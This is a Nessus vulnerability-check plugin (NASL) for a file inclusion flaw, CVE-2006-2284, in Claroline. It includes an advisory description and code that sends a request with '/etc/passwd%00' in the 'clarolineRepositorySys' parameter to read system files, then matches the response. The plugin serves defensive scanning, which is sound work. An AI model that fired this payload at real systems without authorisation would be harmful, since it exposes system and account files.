#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains multiple PHP scripts that are affected
by remote file include issues. 

Description :

The remote host is running Claroline, an open-source, web-based,
collaborative learning environment written in PHP. 

The version of Claroline installed on the remote host fails to
sanitize input to the 'clarolineRepositorySys' and 'claro_CasLibPath'
parameters of the 'claroline/auth/extauth/drivers/ldap.inc.php' and
'claroline/auth/extauth/casProcess.inc.php' scripts respectively
before using it to include files with PHP code.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit this issue to view arbitrary files on the remote
host or to execute arbitrary PHP code, possibly taken from third-party
hosts. 

See also :

http://www.securityfocus.com/archive/1/433249/30/0/threaded
http://www.claroline.net/forum/viewtopic.php?t=5578

Solution :

Apply the patches referenced in the vendor advisory above.

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description)
{
  script_id(21335);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-2284");
  script_bugtraq_id(17873);

  script_name(english:"Claroline Multiple Vulnerabilities (3)");
  script_summary(english:"Tries to read a local file using Claroline");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("claroline_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/claroline"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit a flaw to read the albums folder index.php.
  file = "/etc/passwd";
  req = http_get(
    item:string(
      dir, "/claroline/auth/extauth/drivers/ldap.inc.php?",
      "clarolineRepositorySys=", file, "%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but an attacker with
    #     local access and/or remote file inclusion might still work.
    egrep(pattern:"main\(/etc/passwd\\0/auth/extauth/extAuthProcess\.inc\.php.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd[^)]*\): failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction or...
    egrep(pattern:"main.+ open_basedir restriction in effect. File \(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
    else report = desc;

    security_warning(port:port, data:report);
    exit(0);
  }
}
